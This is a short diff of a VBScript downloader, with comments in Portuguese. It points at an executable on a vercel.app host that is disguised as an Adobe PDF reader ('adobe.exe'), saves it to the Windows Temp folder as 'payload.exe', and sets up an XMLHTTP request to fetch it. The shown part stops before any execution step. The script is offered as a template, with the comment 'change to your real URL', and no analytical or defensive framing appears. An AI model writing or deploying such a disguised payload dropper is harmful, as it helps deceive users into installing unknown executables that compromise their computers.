@@ -2,7 +2,7 @@ Option Explicit
 
 Dim urlExe, destinoExe, http, stream, shell
 
-urlExe = "https://testando123-blond.vercel.app/Adobe%20-%20Leitor%20de%20PDF.exe" ' Altere para sua URL real
+urlExe = "https://testando123-blond.vercel.app/adobe.exe" ' Altere para sua URL real
 destinoExe = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\payload.exe" ' Pasta Temp
 
 Set http = CreateObject("MSXML2.XMLHTTP")
